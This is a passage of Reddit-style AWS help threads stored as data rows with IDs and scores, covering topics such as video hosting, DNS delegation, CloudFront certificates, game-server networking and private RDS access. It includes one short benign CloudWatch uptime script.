If you want bad documentation, look at the Spring/Hibernate Enterprise Java documentation. It's so bad that it spawned an entire industry that was nothing but publishing books to tell you the things the documentation won't tell you. The only way to do Spring / Hibernate programming based on the ""official"" documentation is to look at the source code, which I do not recommend because it's turtles err stupidity all the way down. How these people could arrive at the absolute most inefficient way of doing everything, repeatedly, at multiple layers, eludes me. Clearly Peak Stupidity had something to do with it. What else can explain a database persistence layer that is  CPU-limited rather than IO-bandwidth limited?!",0.0
g706q9x,j129il,"Every example assumes you are a total beginner and/or want to use the web console.

IMHO, every example should instead include how to do it in cloudformation. Even people who use different IaC tools could translate easily.",0.0
g6w152r,j0x10p,"Define enough.

Will it work. Probably.

Will it be optimal. Probably not. 

Why host the vids yourself? It will cost you money to store and bandwidth charges when they are downloaded. You can upload it to youtube or vimeo or pornhub and they host it, have a neat player app and take care of bandwidth optimisation and manage availability a shed load better than a few randoms advising you on reddit are going to be able to.",4.0
g6xalcp,j0x10p,"Well i’m looking to build an app for my students where they can find videos i made, but i also want to have a good user experience because i intend to make a living from those ( i do not want ads or anything that can pollute the videos) and i don’t know if youtube and co will provide that",1.0
g6w08pf,j0x10p,See if Elastic Transcoder would be a solution.,2.0
g6xam8u,j0x10p,I’ll look into that thanks !,1.0
g6x47ku,j0x10p,"Well, I can't speak for anyone else, but the setup we use at OtherWorlds TV has been working nicely for nearly 2 years now.

We store our video files (in mp4 format) on S3. That connects to a CloudFront distribution, which in turn (thanks to WAF) serves to a specific set of IP addresses to our CDN, which in turn serves to the end users. Total cost, about $125/month end to end.
 S3 -&gt; CloudFront -&gt; CDN -&gt; End Users is actually cheaper than just S3 -&gt; CloudFront -&gt; End Users or S3 -&gt; CDN -&gt; End Users.


(*Yes, I know CloudFront is a CDN in its own right. I also know from experience that CloudFront is expensive compared to dedicated CDNs.*)",2.0
g6xaq4n,j0x10p,"Thank you for ur answers ! That seems a little bit too much for what i intend to do but i keep in mind your solution, that can be useful for another project of mine !",2.0
g6xcqb1,j0x10p,"Well, it depends on your audience size. We get about 27,000 viewers per week, but it scales nicely.",2.0
g70cukg,j0x10p,"It’s principaly for my students, so i won’t expect that much of trafic ! Are your videos long ? Do you use a specific tool to convert them ?",2.0
g70edqz,j0x10p,Our videos range from 15 second blips to 2 hour full length hosted (think Elvira or Joe Bob Briggs) movies. We run all our movies through a special script using ffmpeg to match the resolution and bitrate. Works pretty decently.,2.0
g73ngoq,j0x10p,Thank you so much for taking some time to share !,2.0
g6w22wm,j0x53t,"If you are coming from Heroku, you way want to look at Elastic Beanstalk, which does a lot of the infrastructure configuration for you. It doesn’t cost anything to use Beanstalk, you are just billed for the resources it creates, like EC2 Instance(s), ELB/EIP, etc.

https://docs.aws.amazon.com/elasticbeanstalk/latest/dg/create_deploy_nodejs.html",6.0
g6vsm8k,j0x53t,UPDATE: It is NGINX generating the error and it seems that it won't even serve the index.html file.,1.0
g6vxxtu,j0x53t,"Have a look at Amazon Lightsail. It will setup AWS security and networking for you to get started more easily. Later you can promote it to a regular EC2 if you need to.

https://lightsail.aws.amazon.com/ls/docs/en_us/articles/amazon-lightsail-quick-start-guide-nginx",1.0
g6w2iny,j0x53t,Do you use windows 10 ?,1.0
g6y3qee,j0x53t,"the tutorial you linked uses port 4000, but the backend repo uses port 5000 (FYI, the node.js default port seems to be 3000). Try updating the nginx conf to port 5000 and restart nginx.",1.0
g6wm4tr,j0w4s0,What are you trying to set up? I use Buddy CI/CD for a Django app deployed on AWS EB and it works fine.,1.0
g6z1r25,j0w4s0,"Take a look at CodeStar. It has quick getting started guides for Ci/CD with Django. 

The options are ElasticBeanstalk and EC2.",1.0
g6uwad9,j0ot6y,"Lambda for the backend and store your static assets - JS/HTML/CSS in S3.

If you decide to open source it on GitHub, I think that would be a cool little portfolio project.",2.0
g6vr43n,j0ot6y,"Yes, and maybe adding API Gateway is better.",1.0
g6uvc39,j0pmhc,"\&gt; **How is AWS incorporated in app development? Like, not to sound extremely dumb but how is hosting connected to the website or app?** 

EC2 is just servers. To run an app on AWS you often create a loadbalancer and point a DNS name such as [www.example.com](https://www.example.com) at it. You point the loadbalancer at one or more servers, and you run your application on those servers.

&amp;#x200B;

\&gt; **And how am I using my app/website that would lead to 626 hours**

You are charged per minute for every minute your servers are running, regardless if they are doing anything. If you are running very low-volume applications you can run it as a AWS Lambda where you pay per-second for each request, but nothing for idle.

626 hours is 26 days, so it looks like you were running that t3.small for about a month.

&amp;#x200B;

\&gt; **How do you know how much your limit should be increased to in order to have enough transactional and promotional sms? How can I increase the number of OTP's I'd like to send out?**

'How many' is purely a business question for you; how many do you need? You can file a 'service limit' request to raise that limit to however high you can justify; obviously you'll have to pay for them if you  use it. Higher service limits are free but usage still costs.",2.0
g6v89tm,j0pmhc,"Thank you for your reply!

**for the EC2**: How does the connection happen between the website/app and the server, in terms of the back end (coding?) who provides what and where is it inputted?

**for the SMS OTP**: I've raised it to 2$ but what if I wanted to keep it open because I don't want to suddenly stop receiving OTP's mid way. 

And also, when I checked how many I sent, it was actually less than the limit so I don't know why the others are failing to send.",1.0
g6vskm8,j0pmhc,"EC2: That is a rather broad question.  As an example: Develop an application on your desktop. Note everything the application requires to function. Now provision a EC2 node. Practice installing all the same things including your code.

&amp;#x200B;

Now write a small script that does the same thing. Boot a new node that performs that installation at boot time (UserData can do this) and have it download your code from an archive you made in S3. Now you can replace your nodes at will and the new one will come up.

Alternatively you can use Elastic Beanstalk if you are writing the application in one of the platforms it supports. That'll take care of the load balancer and software installation so long as you provide the appropriate configuration.

The 'who' all depends on your organizational structure. It might be you; it might be a developer you've hired; it might be a specialized release &amp; deployment engineer. It comes down to how much time &amp; money you have.

&amp;#x200B;

I'm not familiar with the SMS feature so can't say what might be going on there.",1.0
g6v69vs,j0sbbb,"Just add the NS records for gcp to mydomain.com.

Creating gcp.mydomain.com will cause aws to act as an authoritative nameserver for the subdomain. That's not what you want.",2.0
g6urihf,j0sbbb,"This looks mostly right, if your root zone (mydomain.com) has an NS record pointing at your GCP name servers for gcp.mydomain.com that delegates all DNS for that subdomain to GCP instead of Route53.

Using a tool like dig, you first want to check that this NS record is present on your client (it’s also worth noting that depending on your TTL it could be cached and you just have to wait).

If you can properly resolve your NS record, I’d try querying for the A record jenkins.gcp.mydomain.com. I would expect this to resolve correctly. I would not expect gcp.mydomain.com to resolve anything meaningful because you don’t have a root record specified (which you could add in your GCP zone)",0.0
g6urokg,j0sbbb,You don't have an A record for gcp.mydomain.com so there's nothing to return from GCP's name servers. However jenkins.gcp.mydomain.com should return the correct IP.,0.0
g6uruvy,j0sbbb,"You can use the dig cli tool to check things too. Make sure you're querying for the ns record type. If you tried to query fairly soon after adding the ns record in route53, you must be seeing a cached result. It takes time for record changes to propagate, even within aws. Just a couple things to consider.",0.0
g6uzejo,j0sbbb,As it can be seen from the image that the TTL value is set at 172800 which equals to 48 hrs. So you may have to wait for that much hrs to propagate the DNS to resolve successfully.,0.0
g6ur4ps,j0sb9d,Running your infrastructure redundantly across multiple AZs is a basic best practice in AWS. Your subnets should be arranged to enable that.,4.0
g6v2mkt,j0sb9d,Your 1a-1f are randomly determined for each account so as not to overload any one AZ. So pick whichever one.,3.0
g6uvmt2,j0sb9d,"I spread mine out starting with 1a and moving to 1f (though almost nothing I have can run in 1e). This way if I need it, I don’t have to worry about provisioning a new subnet later.

I have a relatively small set of infrastructure but generally set my subnets up that anything above x.z.128.0 is private and under x.z.128.0 is public (e.g. 192.168.1.14 is public, 192.168.132.143 is private). Then, because I don’t have that much running, I split each subnet down to /23 grouping so each subnet has  510 addresses. I can add more later, but that is more than enough for my use cases currently.",1.0
g6w0rh1,j0sb9d,"From the infrastructure side, I think they will have same standard performance whichever AZ you choose.


Depend on your workload,
If app + db you should put it in one AZ for better performance, but still Multi-AZ deployment is recommended.",1.0
g6y9whn,j0sb9d,Dont put them all in one az. Spread them and your workloads out across multiple azs. The idea is that AZ should fail independently. So if you have your workload in multiple azs then one az failing wont take you down.,1.0
g6urqtq,j0rxvq,"You will need to allow them, they are not automatically permitted.

You can add them statically via I.P range or you can scrape the json file regularly via a lambda and update the security group programmatically.",2.0
g6xaqeg,j0rxvq,"I see. I hope there's a way to reference some sort of AWS internal alias or arn or something, instead of the raw IP addresses from the health checkers across regions.",2.0
g6wk6s0,j0rxvq,"You’ll need to allow them into the front door of your XLB in front of your services, but not the instances themselves. Not to pick nits just want to make sure the division of security is understood.",2.0
g6xauy0,j0rxvq,"That's a very important note. Makes sense. I just hope that in general at the SG level, we can reference dynamic Health Checker endpoints without specifying the IP addresses across regions.",1.0
g6xedxh,j0rxvq,I think you gotta add port in security group,1.0
g6ujz3b,j0qmby,"We use haproxy enterprise + letsencrypt behind an NLB for a similar use-case (~40,000 customer certs). Certs are generated through a separate system and distributed to the haproxy nodes on a schedule, then reloaded.",3.0
g6uoo3b,j0qmby,"Do you think there's a way we can get away with using only NLB with amazon certificates, without using a proxy ?",0.0
g6uz4ph,j0qmby,"Each NLB can support up to 25 certificates (though there’s a possibility that could be raised some), and each certificate can support up to 100 hostnames (though there’s a possibility that could be raised some); also downside is that anyone examining the cert could identify up to 100 customer domains). 

So, best case of 100,000 certs with multiple domains, you’d need 40 NLBs; worst case of one domain per cert would be 4,000 NLBs. 

The first *might* be manageable. The latter probably not so much.

This also assumes that you could get the very (relatively) restricted ACM (https://docs.aws.amazon.com/acm/latest/userguide/acm-limits.html) and NLB (https://docs.aws.amazon.com/elasticloadbalancing/latest/network/load-balancer-limits.html ) limits raised for your use case.",2.0
g6wjav5,j0qmby,"&gt; also downside is that anyone examining the cert could identify up to 100 customer domains).

This is a non-issue as anyone can simply go search the CT logs to see which public certificates you've issued. You can even setup live feeds of this data. For example, I will know within seconds of you creating a certificate with ACM unless you've specifically told Amazon to withhold the certificate from CT logs at which point it won't be trusted in any modern web browser.

https://transparencyreport.google.com/https/certificates?hl=en

https://crt.sh/",1.0
g6wm07v,j0qmby,"It wouldn’t be that easy unless there’s a direct tie to the issuing organization. In OPs, and my use case, the certs are generated using the *customer’s* domain. I.e. my domain may be foo.com, but my certs may be for site1.bar.com, site2.baz.org. I don’t believe that you could tie all those together under one entity using CT. In the scenario of shared certs knowing site1.bar.com would reveal site2.baz.org and any other domains on that cert, either through direct inspection or CT, but you wouldn’t know any more than 100 of them through either source. In the case of single-domain certs, you could only know the one through either source.",2.0
g6wm90t,j0qmby,"Given a list of certificates in the CT logs, it's not difficult to do a DNS lookup and tie them together that way so if they're tried to the same NLB it would be easily discoverable.",1.0
g6uln5f,j0qmby,"Can you describe your architecture in more detail please? How are resources shared between customers?

How will the certificates be used?

Since you mentioned you wanted to add more certificates to the Cloudfront distribution, why not create a different distribution per customer? For the scale you talk about, you will need to request some quota increases, and you may also want to distribute this over multiple accounts somehow?

Do you have an account manager assigned you can reach out to? It will be important to review this with a solutions architect who can talk directly to the various service teams to determine the best way to solve this.",2.0
g6uo5vy,j0qmby,"It's a SaaS service, angular frontend interprets the window URL and retrieves the data for the user from the dynamodb database (based on the url). So we have one single codebase in our cloudfront distribution which makes ci/cd easier.

I believe there is a hard limit to cloudfront distributions (certainly not 10K+) or ALB/NLB certificates",2.0
g6uz86j,j0qmby,"You could still use the same origin behind all the different distributions.

Any hard limits could be worked around with multiple accounts.

I don't think you should have to give up your serverless architecture because of this. Will you reach out to your account team? You should see how the solutions architect and the service teams would deal with this.",4.0
g6vy82k,j0qmby,"&gt; You could still use the same origin being all the different distributions 

Can you explain this a bit more for me? I thought that because cloud front will only accept limited SSL certs that this would end up being a no go. Sure people could connect to cloud front, but the cert wouldn’t be for them. 

Happy to pay you for some time on a call if you’re up for it. This is important to me.",1.0
g6w7btv,j0qmby,"Cloudfront distributions are what the end users connect to. You can only have one certificate per distribution. Origins are http endpoints that Cloudfront connects to in the backend. It's basically just a URL. You can have multiple origins on a distribution. You can also use the same origin in many different distributions.

&gt;Happy to pay you for some time on a call if you’re up for it. This is important to me.

I'm an AWS Solutions Architect, but I answer here in my free time and with my own opinion. I don't consult on the side. You should reach out to your account team to get more information and ask for help from a Solutions Architect.",3.0
g6w7o2g,j0qmby,"My point here is that if I have 20/200/2000 customer domains all trying to get to one Origin, cloudfront isn’t set to handle that without making multiple distributions. Is that correct?",1.0
g6wspmz,j0qmby,"That's a possible workaround I mentioned. It's going to be somewhat complicated to manage thousands of distributions, but there wouldn't be additional cost.",1.0
g6w2zwm,j0qmby,It would be great to find a serverless alternative,1.0
g6w63wy,j0qmby,"At the company I work at, we use wildcard in the certificate. So customer1.sass.com and customer2.sass.com use same cert with hostname *.sass.com. We serve 18000 customers this way for years and have been successful. We add and remove customers on daily basis. This design greatly simplify the management of SSL certificate. We only have a handful of them managed by AWS.",2.0
g6wh21j,j0qmby,Yeah we do the same for subdomains. but this wouldn't work with separate domain names,1.0
g6v9x0w,j0qmby,"This could maybe be of interest. It is written from the perspective of PHP/Laravel but I don't think any of the techniques is limited to that.

https://laravel-news.com/unlimited-custom-domains-vapor",1.0
g6ukozb,j0qki4,"Look into CloudFormation nested stacks. Basically you have one “parent” template where you define your “child” templates as Cloudformation resources.

That way you can get around the limit while still passing shared values to the child stacks as parameters.

Also look into Cloudformation exports as an option for sharing those values.",4.0
g6ufvtb,j0qki4,"You can reference CF within CF.

https://docs.aws.amazon.com/AWSCloudFormation/latest/UserGuide/aws-properties-stack.html


This means you will have 1 child CF per Lambda but you will include them all within 1 ""large"" deployment.",1.0
g6ulihe,j0qki4,"You may want to consider graphql, so you don't have too many endpoints.",0.0
g6ups64,j0qki4,"Graphql requires resolvers. If you choose lambda functions as your resolvers, you'll be in the same boat.",2.0
g6uj3sc,j0qdkf,"Rather than try to fudge around with VPCs, Internet Gateways, Subnets, Routing, and all the fun stuff. Have you considered Amazon light sail? It’ll be simpler, cheaper, and easier to get it set up.",33.0
g6vciny,j0qdkf,"This is the best answer to this specific question, but I also want to throw it out there that you can rent servers that are setup to host these games relatively cheap.

I mean, if you're gonna go as far as simplifying the process to the point of using Lightsail, it's worth considering the next step and just leaving it all to a dedicated service.",8.0
g6ugc7h,j0qdkf,"Do you have a IGW attached to the VPC?
Have you checked your route table? Is there a route to the IGW?
Does your instance have a public ip?",14.0
g6uhdm5,j0qdkf,Also don't forget to make the public ip static,7.0
g6uhsl2,j0qdkf,Attaching an EIP to your instance 😁,5.0
g6ui3n5,j0qdkf,"Route table says:

 

**Destination**

**Target**

**Status**

**Propagated**

172.31.0.0/16local

active

No 

&amp;#x200B;

172.31 is my private IP so definitely coming through. I do have public IP as well. But basing on the screenshot, current VM's public and private IP differs from the one on the Elastic IP addresses. Maybe that's what causing the issue?",1.0
g6ukjnx,j0qdkf,"Hmm whats the route table, of the subnet that your instance is on.

Itll need to have 0.0.0.0/0 to igw there for this to work",8.0
g6uknkc,j0qdkf,"Also post your security group open ports here, your issue may be that the Left for Dead server needs specifc ports open, that arent open on your security group.",2.0
g6uxpp0,j0qdkf,Word of advice: Don't use Windows for a game server if you can use Linux. You'll save money and headaches not having to deal with Windows.,7.0
g6ughec,j0qdkf,"Is the server on a public subnet in the vpc?

Fwiw, I probably wouldn't use AWS for hosting a gaming server, it's got a lot of features you don't need and are complex to set up/add to the cost.

Digital ocean or linode are probably better for that purpose.",5.0
g6uie3m,j0qdkf,"I can't confirm yet since it looks like the VM instance has a different public IP than the one I had setup in VPC.

I'm actually trying to see if we can really host server via AWS and for giggles too.",1.0
g6uioba,j0qdkf,"Please please set a billing alarm or budget before you continue. You can Google both. 

It will email you if it expects the monthly cost to go above the value that you set. You will otherwise get burned very quickly. 

Other comments in here have already suggested things like IGW which costs $50+ per month.",-1.0
g6umuhq,j0qdkf,"There is no cost for an IGW. You’re billed for all outbound internet access, but not for the IGW itself. There’s no way to know how much that’ll cost without knowing the amount of traffic.",2.0
g6ugq83,j0qdkf,"With AWS you have to explicitly allow network access on ports through Security Groups. Ping (ICMP) has to be allowed in the security group on the instance. 

You’ll also want to look at your network setup with internet gateways and such to make sure traffic is routing from your subnet to the internet. 

If you’re overwhelmed. Try AWS lightsail which is more like a web hosting virtual server experience.",7.0
g6ugioe,j0qdkf,"Did you assign it a public ip? Provision a igw in the vpc? Routes set up properly? 

It is possible to do this. I’ve never found it economical though. If this is just for friends make sure you click the spot instance button to save a ton of money.",3.0
g6ugfug,j0qdkf,"How did you connect to the EC2 instance to install the game server software?

Does the route table for the subnet have an internet gateway?",1.0
g6ui5ei,j0qdkf,"I did RDP, and I was able to download and install the game server from Steam

Yes it has gateway.",1.0
g6upekw,j0qdkf,If you could do this then the odds are that the game is using a port that you have not allowed. Does it get fixed if you just open up all ports on 0.0.0.0/0? You don’t want to leave it this way but you can do it quickly to test if it’s just a missing port or not - then lock it down and start looking at what that port is.,3.0
g6w1r5z,j0qdkf,"Yup, and check whether your games service port is already listening or not. If its listening, op problem is more likely on networking.",1.0
g6ugfwn,j0qdkf,What does the route for your subnet look like?  Your default route should go.to an igw in order to make that work,1.0
g6ui7s2,j0qdkf,"Let me get it checked since here's what I got on my route table:

 

**Destination**

**Target**

**Status**

**Propagated**

172.31.0.0/16local

active

No",1.0
g6ukp60,j0qdkf,"So you will need to have your box on a public subnet.  To make a subnet public, you need an intrrnet gateway and a default route that points to an internet gateway.  You will also need to add a public IP to your server.  If you are giving that address to your friends, I'd suggest an elastic ip rather than just a public.  

But what else do you have on that subnet?  Adding a default route will effect everything else in that subnet.  So don't make the change until you understand the impact",2.0
g6um81k,j0qdkf,Is your machine able to connect out? The game server may need to connect back home.,1.0
g6umgk8,j0qdkf,Sounds like you just want to setup a VPN with your friends.,1.0
g6voeg8,j0qdkf,have you considered gamelift?,0.0
g6ugr96,j0osrv,"Serving the static content through lambdas seems like adding complexity for something that should be fairly simple.  You might appreciate this blog post about how to use cognito with cookies to secure the static assets served through cloud front:

https://aws.amazon.com/blogs/networking-and-content-delivery/authorizationedge-using-cookies-protect-your-amazon-cloudfront-content-from-being-downloaded-by-unauthenticated-users/",7.0
g6v840j,j0osrv,"it adds some complexity, but this is the “generally right” answer.",3.0
g6vgxf0,j0osrv,"Great link, thank you for this, it’s given me plenty to consider, and I’m probably not going to do a response justice here, but will fire some thoughts down.

I have an HTML template that i’m using to build the UI for this functionality, the CSS etc I’d store statically in S3 but the pages I think I want to build dynamically based on the user and their level of access (probably controlled through DynamoDB as Cognito is only authentication). 
I’m not sure how far I’d get with the SPA approach (typically the webpage I’m creating will just be a form which will post to an endpoint), but I get that the principles apply for other use cases.
Given this, I’d see this approach to be similar(ish) to a signed URL. This would seem to solve the problem of preventing the page loading when users aren’t authenticated, but I think I’d want to leverage Lambdas to build the page rather than client side scripting.

I appreciate your response though, if my thoughts above are rubbish feel free to call that out, always happy to learn!",1.0
g6u6s0p,j0osrv,"I’m not sure if this fits your use case, but could you have the admin web pages be static websites protected by pre-signed URLs?  When authd through cognito a presigned url could be generated. I haven’t protected web pages this way, but I have used this to protect access to other assets stored in S3.",3.0
g6u7l1t,j0osrv,"Yes, I guess that would be a feasible way of doing it too. My thought through going serverless was that I could determine the functionality the user is allowed to use by dynamically building the page depending on the user who is logged in. I could achieve that by different pages per feature I’d give access to if I went the signed URL route. I’m guessing signed urls can point through cloudfront(?) as my bucket isn’t publicly available. I’d need to look more into that though. Thanks for your comment!",1.0
g6uh8ih,j0osrv,"webpack supports splitting your code into separate .js bundles (and this should work with CRA if you're using that).

you could put the sensitive part of your site in one js bundle and a minimal login-with-cognito bit in the main.js

then use cloudfront with lambda-at-edge to enforce and validate cognito auth tokens present in the request for anything that requires login e.g. starts with a particular path prefix.",2.0
g6vhztr,j0osrv,"Webpack I’ve only briefly touched through a work project, I should dig into it further. On a quick glance, it seems this would be the way to go if I was going down the React line as you say. 
Someone else mentioned using lambda@edge too for restricting access. Definitely a viable solution, but not sure it’s where I’m wanting to be going at the minute, but would likely be where I end up if my original thought doesn’t pan out. I think the ability for dynamically creating pages for specific users within the Lambda is where I’m aiming at the minute.",1.0
g6uiwrh,j0osrv,"Going back to the S3. Maybe this could help. LMK if works. 

https://docs.aws.amazon.com/IAM/latest/UserGuide/reference_policies_examples_s3_cognito-bucket.html",1.0
g6vp463,j0osrv,"You should look into amplify, part of what it provides is pre-built components that I think your use case fits with.

They will automatically redirect a viewer to auth for you and you don't need to do much at all but put the high level component at the root of tha page.",1.0
g6u4vo2,j0pij6,I’d suggest AWS LightSail. Should let you get this done with absolutely no fuss and has a nice easy wizard based interface. I think they support IIS also!,8.0
g6u55hp,j0pij6,"Was just about to suggest this, +1 for LightSail in this scenario!",2.0
g6u2pr6,j0pij6,"Create a VM in EC2 and install the required roles (DNS, IIS, SQL, .NET, etc.), you can later modify the inbound and outbound rules to allow RDP from a specific IP or range of IPs

I think there’s a service in AWS that helps you with setting up a web server",3.0
g6uklfk,j0pij6,"Is this for a proof of concept app, a small internal utility, or is it the start of a production application?",2.0
g6utwan,j0pij6,"Proof of concept, but it is reasonably likely to enter the market very soon after.",1.0
g6u3648,j0pij6,"What's your experience?

This seems simple enough. 
You can roll out a windows instance and add those features from the server manager. 

Or get an Ami off the marketplace that has those installed.",2.0
g6u30vx,j0pij6,Search in quickstarts. I’m sure you’ll find something there,1.0
g6v9xv5,j0pij6,"Hey, a quick Google search:

[https://docs.microsoft.com/en-us/azure/virtual-machines/windows/tutorial-iis-sql](https://docs.microsoft.com/en-us/azure/virtual-machines/windows/tutorial-iis-sql)

[https://aws.amazon.com/getting-started/hands-on/host-net-web-app/](https://aws.amazon.com/getting-started/hands-on/host-net-web-app/)

[https://stackoverflow.com/questions/58192710/how-to-install-iis-in-windows-ec2-using-aws-codedeploy](https://stackoverflow.com/questions/58192710/how-to-install-iis-in-windows-ec2-using-aws-codedeploy)

[https://aws.amazon.com/premiumsupport/knowledge-center/public-website-ec2-iis/](https://aws.amazon.com/premiumsupport/knowledge-center/public-website-ec2-iis/)

[https://mattbobke.com/2020/04/03/deploy-and-configure-an-aws-ec2-iis-web-server-with-powershell-and-dsc/](https://mattbobke.com/2020/04/03/deploy-and-configure-an-aws-ec2-iis-web-server-with-powershell-and-dsc/)

[https://docs.aws.amazon.com/AWSEC2/latest/WindowsGuide/install-WIMP.html](https://docs.aws.amazon.com/AWSEC2/latest/WindowsGuide/install-WIMP.html)

You can always try the AWS website, stackoverflow and Google for what needs to be done.",1.0
g6xokdd,j0pij6,"as someone who has created and managed windows servers in both aws and azure, I still far prefer aws. userdata is much easier than a vm extension imo.

windows ec2 instance + userdata to run some powershell - take a look at [this](https://docs.microsoft.com/en-us/sql/database-engine/install-windows/install-sql-server-with-powershell-desired-state-configuration?view=sql-server-ver15) link for sql with dsc, and [this](https://support.inforouter.com/documentation/v80/powershell.aspx) one for iis and dotnet.",1.0
g6u4ius,j0pij6,"Quick, someone, tell him about the billing things and license thing if he chooses to clone the VM.  I forget what it was, but I remember that the licensing method on a Windows AWS machine can trip you up.",1.0
g6ux47k,j0pij6,"Time to move to /r/AZURE :D

Have you ever set up a Windows machine before? If not, I’d start by looking for Windows EC2 tutorial, as this is a common scenario.",1.0
g6wxwhh,j0pij6,Azure is way better for Windows deployment,0.0
g6uov04,j0l1eh,"&gt;	As of Sep 2020, the main reason to use HTTP APIs seems to be the cost. However, if your APIs need any of the features not yet supported by the HTTP APIs, using the REST APIs will be your best bet.

What a riveting take away. This is just blog spam.",6.0
g6toj86,j0ocmx,The error indicates that you need to define separate output artifacts for your separate steps.,1.0
g6tueso,j0ocmx,"But how can I achieve this as its in a loop, would it be best to array a ‘new code pipeline artifact’?

Thanks",1.0
g6tv0h9,j0ocmx,Currently you don't use a loop to add the two steps (the loop outside seems to have nothing to do with the problem).,1.0
g6umh2q,j0ocmx,"The entire block is in a for-loop; I pass it [master, slave] which is used to generate unique names, but fails when I try and use it on output :/ Any ideas on the best way round this?",1.0
g6vrx5c,j0ocmx,The problem is not with the for loop - replace it by just running the code for master and you will get the same error,1.0
g6s4zau,j0k4p1,"Rather than use the period, you can use the EvaluationPeriods for this. Currently, the value needs to be breaching for one period, however, changing the period to 60 (1 minute metrics) and changing the EvaluationPeriods to 120 should get you what you want.",6.0
g6t7eum,j0k4p1,"Dont do this unless you have detailed monitoring enabled.

Also a cheaper solution would be to just run a cron job on instance which will check the uptime and do whatever action you want.",4.0
g6sxu7n,j0k4p1,[deleted],2.0
g6tjvov,j0k4p1,Instance Scheduler is great for this:  https://docs.aws.amazon.com/solutions/latest/instance-scheduler/architecture.html,2.0
g6ume6r,j0k4p1,"Thanks, I tried this with a t2.micro and it didn’t work. Going to try this with an f1",1.0
g6und2a,j0k4p1,"```
#!/bin/bash
UPTIME_IN_SEC=$(cat /proc/uptime | cut -d. -f1)
INSTANCE_ID=$(curl -s http://169.254.169.254/latest/meta-data/instance-id)

aws cloudwatch put-metric-data --metric-name instance-uptime --dimensions Instance=${INSTANCE_ID} --namespace ""MyCustomMetrics"" --value ${UPTIME_IN_SEC}
```

Run that in cron every minute. Make sure to attach appropriate `cloudwatch:PutMetricData` IAM policy to instance profile role.

Your metric is already an incremental integer value, so just trigger the alarm based on return value over 7200 (seconds) without the need to take seconds eval period interval into consideration or any other hacks AWS/EC2 metrics does not support.",2.0
g6sdc65,j0ieri,"Do you mean if a bucket doesn’t have any objects by 8:00 AM for example?

If so, you could use CloudWatch Events to trigger a lambda at 8:00 AM. The lambda would call list_objects. If nothing comes back send a message to an SNS topic. 

https://alexwlchan.net/2017/07/listing-s3-keys/

I’m assuming you know Python?",4.0
g6sortu,j0ieri,exactly what i need. thanks so much,1.0
g6rb0oj,j0gkte,"This library should help. 


https://pypi.org/project/dynamodb-json/",2.0
g6v34yx,j0gkte,boto3 has a built in converter. you can use this as a reference - it's very simple but they don't make it easy to find. https://github.com/xoeye/xoto3/blob/cb33805856613543a3b417baca58b12d4fbf219a/xoto3/dynamodb/utils/serde.py#L3,1.0
g6qx2mk,j0fzam,"Yes, and it works very well!

We do this for encrypting important files when they're downloaded, and decrypting them when they're used. We let the HSM instance hang around for an hour or so after use, just in case another job comes in. Then happily delete it.",4.0
g6qv805,j0fzam,"Yes you can take backups and perform restores but it’s not really an on demand service.

The use case is to provision it and use it more like a cloud host physical device.

The AWS CloudHSM is cheaper than the legacy CloudHSM which is actually a physical SafeNet Luna box.

I’m guessing you have a third party application that is using it’s API for crypto operations otherwise a KMS CMK with it without custom key Material would be a cheaper option.",2.0
g6tb1nb,j0fzam,"On-demand is definitely a viable use case. There are plenty of situations where you only need an HSM every now and then rather than always-on, e.g. code signing with an infrequent release schedule.

Manual backups and restores aren't required either. If you delete the last HSM in a cluster it will save the cluster's state and you won't have to pay anything. Then if you add an HSM to the same cluster it will spin it up with the same pre-delete state and start charging again.

Manual backup/restore works at the level of the complete cluster, so it's only needed if you're doing something like cloning one to a different region.",5.0
g6thh2a,j0fzam,"I was thinking OP was referring to a use case that  more frequently called the HSM but your right, something like Code signing is a good use case of saving state and only running on demand.",1.0
g6ulcq1,j0fzam,"This is possible and a very valid use case. If you remove all the instances in the cluster and then create new one in the same cluster you will have all the settings, users and keys that you've had in there previously.

The only downside is that it takes quite some time for the new instance to spin up. I'd say something like 10-15 minutes, so you'll need to take this into consideration.",1.0
g6rorn6,j0fzam,"Do you really need FIPS140-3 compliance? If not, you do not need cloud hsm. If you do, the cost should be negligible.",0.0
g6v1mj8,j0fzam,"Might need pkcs#11 or ms sng.
Or not use envelope encryption.",1.0
g6qrsuy,j0fvt7,"You can't for an IAM User or root. If you use an external identity provider to assume an IAM Role you may be able to if you use an idp that supports duo specifically. Basically it needs to integrate with the duo api to give you a push, otherwise it just does totp which has you entering the code.",2.0
g6tc4bk,j0fvt7,We authenticate to SSO in my place using Duo. You need to type 'push' into the place where it asks for the code for it to pop up on your phone. I didn't set it up though so not sure if any extra config is required. It always seemed a bit off to me that this was a requirement at all...,2.0
g6vl1rp,j0fvt7,"Ya I've tried typing ""push"" and it just says that the code is invalid, so there must be something else going on in your configuration",1.0
g6rk7dm,j0fvt7,"Supporting what u/Enoxice is saying, you would need to use Duo Access Gateway in combination with an idp. In our case we use DAG in combination with Active Directory credentials to authenticate to the console. The DAG gives us the option to do a push for MFA.",1.0
g6rloea,j0fvt7,That’s a bit over my head. Do you know of any documentation on how to do this?,1.0
g6q6cba,j0droo,"We're using ssm via ec2 instance as jump host for our rds instances. Yes, another instance to manage. But it isn't public reachable so the attack surface is pretty thin.",25.0
g6r45tm,j0droo,"Same, really helps with compliance too without much overhead, everything typed into SSM gets logged in the organization's trail for audit purpose.",6.0
g6qn36l,j0droo,"SSM can do port forwarding now, so if you install ssm agent on one of the servers in the same subnet as the RDS, you could do it that way.",12.0
g6r5c0b,j0droo,Using SSM is a great way to do this. No bastion host needed and you can directly connect to a server from the console or AWS cli. https://docs.aws.amazon.com/systems-manager/latest/userguide/getting-started-restrict-access-quickstart.html,7.0
g6rthhr,j0droo,"The Instance running the SSM agent _is_ the bastion host. It does avoid ingress rules, but I’m happy to use ssh and something like bless for auth.",12.0
g6soplq,j0droo,"I've heard the performance is terrible, because SSM tunnels everything via HTTPS. And working with databases becomes unbearable.",5.0
g6syb1s,j0droo,"It is, I've been setting this up because it sounds nice on paper. And then you make a connection with a db and it seems to work, but it only allows one connection so the average DB gui doesn't work properly and the end result is quite disappointing.  

Our setup is SSM portforwarding to bastion and the bastion server has socat installed to forward to the rds instance.",5.0
g6q9f6q,j0droo,Have you looked in to AWS Client VPN to tunnel directly into the subnet?,13.0
g6rqhbb,j0droo,We were doing SSM but recently switched to OpenVPN AMI in EC2. No license fee for up to two users.,4.0
g6u9aca,j0droo,"I use openvpn too. Even if you have to license it, it’s dirt cheap and runs on dirt cheap hardware and performance is way, way better than SSM.",2.0
g6qb7os,j0droo,"I did, it seemed overkill for what we're using it for (its just 2 devs connecting), but I'll have to look more into it.",1.0
